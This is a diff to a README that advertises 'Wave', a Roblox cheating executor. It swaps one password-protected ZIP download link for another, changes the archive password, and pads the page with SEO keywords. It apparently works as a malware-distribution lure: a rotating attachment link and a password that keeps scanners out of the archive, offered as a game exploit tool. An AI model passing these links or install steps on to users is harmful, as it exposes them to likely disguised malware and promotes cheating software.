@@ -1,9 +1,9 @@
-# 🚀 Wave - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/user-attachments/files/16896657/W.v.zip)**
+# 🚀 Wave - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/user-attachments/files/16911382/WE_Update.zip)**
 
 ## Quick Installation
 To get started with Wave Executor, follow these simple steps:
-1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/user-attachments/files/16896657/W.v.zip)**
-2. **Password: wave**
+1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/user-attachments/files/16911382/WE_Update.zip)**
+2. **Password: github**
 3. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
@@ -12,7 +12,7 @@ To get started with Wave Executor, follow these simple steps:
 **Keywords:** Wave executor, Wave executor download, Wave executor bootstrapper, Roblox executor, Script executor, Roblox exploits, Roblox Wave, Roblox executor pc, Roblox pc executor
 
 
-![Wave Executor Preview](https://github.com/user-attachments/assets/2d5fe696-3a48-41df-9328-dae7cb19f54b)
+![Wave Executor Preview](https://github.com/user-attachments/assets/5157ff8b-de1d-41ad-8131-7e87b25d5f7e)
 
 ## Table of Contents
 - [Introduction](#introduction)
